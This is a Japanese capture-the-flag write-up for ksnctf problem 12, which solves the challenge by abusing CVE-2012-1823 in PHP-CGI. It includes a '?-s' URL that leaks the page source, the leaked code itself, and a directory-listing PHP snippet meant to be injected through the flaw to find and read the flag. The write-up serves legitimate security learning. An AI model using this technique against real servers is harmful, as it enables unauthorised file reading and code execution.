## [12. Hypertext Preprocessor](http://ksnctf.sweetduet.info/problem/12)

アクセスすると、なにやら数字が並んでいる。
ページのタイトルが "Clock" で、数字にも日付らしき部分が含まれている。
また、ページを更新するとこの部分の表示も進むようだ。

しかし、年らしき部分の前にも数字の列 "2012:1823" があり、これが何なのか分からない。
そこでググってみると、CVE-2012-1823 が存在し、[徳丸浩氏による解説](https://blog.tokumaru.org/2012/05/php-cgi-remote-scripting-cve-2012-1823.html) を見ると、本問に使えそうなことが分かる。
URLで指定するクエリによってPHPのオプションを指定できるようだ。

例えばPHPコードを表示する `-s` オプションを指定するため `http://ctfq.sweetduet.info:10080/~q12/index.php?-s` にアクセスすると、次のレスポンスを得る。

```php
 <?php

    //  Flag is in this directory.

    date_default_timezone_set('UTC');

    $t = '2012:1823:20:';
    $t .= date('y:m:d:H:i:s');
    for($i=0;$i<4;$i++)
        $t .= sprintf(':%02d',mt_rand(0,59));
?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Clock</title>
    <style>
      body
      {
        background: black;
      }
      p
      {
        color: red;
        font-size: xx-large;
        font-weight: bold;
        text-align: center;
        margin-top: 200px;
      }
    </style>
  </head>
  <body>
    <p><?php echo $t; ?></p>
  </body>
</html>
```

`Flag is in this directory.` とのことなので、CVE-2012-1823を利用してファイルを読めばよさそうだ。
具体的な手法は上述の徳丸浩氏による解説サイトに詳しい。

まず、ファイル名を得るためにディレクトリのエントリを読む。

```php
<?php

$res_dir = opendir('.');
while ($file_name = readdir($res_dir)) {
    print "{$file_name}\n";
}
closedir($res_dir);

?>
```

するとflagが格納されていそうなファイル名が得られるので、今度は `readfile()` で読めばよい。

* [Rust版](https://github.com/ordovicia/ksnctf/blob/master/12_Hypertext_Preprocessor/solve)
    * [cargo-script](https://github.com/DanielKeep/cargo-script) で実行できる。
* [Python版](https://github.com/ordovicia/ksnctf/blob/master/12_Hypertext_Preprocessor/solve.py)
